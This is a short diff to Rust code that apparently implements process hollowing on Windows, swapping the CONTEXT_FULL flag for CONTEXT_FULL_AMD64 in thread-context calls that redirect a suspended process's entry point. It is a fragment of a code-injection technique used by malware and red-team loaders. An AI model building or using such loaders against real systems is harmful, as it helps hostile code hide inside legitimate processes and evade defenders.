@@ -27,7 +27,7 @@ fn hollow_windows(target_path: &str) -> Result<u32> {
     use std::os::windows::ffi::OsStrExt;
     use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
     use windows_sys::Win32::System::Diagnostics::Debug::{
-        GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL,
+        GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
     };
     use windows_sys::Win32::System::Memory::{
         VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE,
@@ -221,13 +221,13 @@ fn set_entrypoint_and_resume(
     ep_rva:  u32,
 ) -> Result<()> {
     use std::mem::zeroed;
-    use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL};
+    use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64};
     use windows_sys::Win32::System::Threading::ResumeThread;
 
     let ep = base as u64 + ep_rva as u64;
 
     let mut ctx: CONTEXT = unsafe { zeroed() };
-    ctx.ContextFlags = CONTEXT_FULL;
+    ctx.ContextFlags = CONTEXT_FULL_AMD64;
     unsafe {
         if GetThreadContext(hthread, &mut ctx) == 0 {
             bail!("GetThreadContext failed");
